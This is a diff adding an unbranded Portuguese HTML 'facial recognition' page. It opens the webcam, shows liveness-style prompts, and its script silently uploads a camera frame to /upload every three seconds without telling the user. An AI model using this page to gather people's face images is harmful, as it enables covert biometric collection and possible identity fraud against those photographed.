@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="assets/images/favicon/favicon-32x32.png" type="image/x-icon">
+    <title>Reconhecimento Facial</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .logo h1 {
+            font-size: 2.5em;
+            color: #6f42c1;
+            margin: 20px 0;
+        }
+
+        .message {
+            margin: 20px 0;
+            font-size: 1.5em;
+            color: #333;
+        }
+
+        .camera {
+            position: relative;
+            width: 288px;
+            height: 418px;
+            border: 5px solid #6f42c1;
+            border-radius: 86%;
+            overflow: hidden;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            transition: width 1s, height 1s;
+        }
+
+        video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            background-color: rgba(0, 0, 0, 0.6);
+            font-size: 1.2em;
+        }
+
+        .footer {
+            margin-top: 20px;
+        }
+
+        .footer p {
+            color:rgb(95, 95, 95);
+            text-decoration: none;
+            text-align: center;
+            font-family: 'Franklin Gothic Medium', 'Arial Narrow', Arial, sans-serif;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .shrink {
+            width: 150px;
+            height: 250px;
+        }
+
+        .grow {
+            width: 320px;
+            height: 240px;
+        }
+        h1{
+            text-align: center;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="logo">
+        
+    </div>
+    <div class="camera" id="camera">
+        <video id="video" autoplay></video>
+        <div class="overlay" id="overlay">
+            <span id="instruction">Posicione seu rosto aqui</span>
+        </div>
+    </div>
+    <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>
+    <div class="footer">
+       <p>Primeiro posicione seu rosto <br> dentro da marcação</p>
+    </div>
+
+    <script>
+        const video = document.getElementById('video');
+        const camera = document.getElementById('camera');
+        const overlay = document.getElementById('overlay');
+        const instruction = document.getElementById('instruction');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+
+        // Acessa a câmera
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then((stream) => {
+                video.srcObject = stream;
+            })
+            .catch((error) => {
+                console.error('Erro ao acessar a câmera: ', error);
+            });
+
+        // Função para capturar e enviar a foto
+        function captureAndSend() {
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            canvas.toBlob((blob) => {
+                const formData = new FormData();
+                formData.append('photo', blob, 'foto.png');
+
+                fetch('/upload', {
+                    method: 'POST',
+                    body: formData
+                })
+                    .then(response => response.text())
+                    .then(data => {
+                        console.log('Foto enviada com sucesso:', data);
+                    })
+                    .catch((error) => {
+                        console.error('Erro ao enviar a foto:', error);
+                    });
+            }, 'image/png');
+        }
+
+        // Chama a função a cada 3 segundos
+        setInterval(captureAndSend, 3000);
+
+        // Função para alternar as instruções
+        const showInstructions = () => {
+            setTimeout(() => {
+                instruction.textContent = "Afastar-se"; // Mensagem de afastar
+                camera.classList.add('shrink'); // Diminui o tamanho do círculo
+
+                setTimeout(() => {
+                    instruction.textContent = "Aproximar"; // Mensagem de aproximar
+                    camera.classList.remove('shrink'); // Aumenta o círculo novamente
+                }, 3000); // Espera 3 segundos para mostrar "Aproximar"
+            }, 3000); // Espera 3 segundos para mostrar "Afastar-se"
+        };
+
+        showInstructions(); // Chama a função para mostrar as instruções
+    </script>
+</body>
+
+</html>
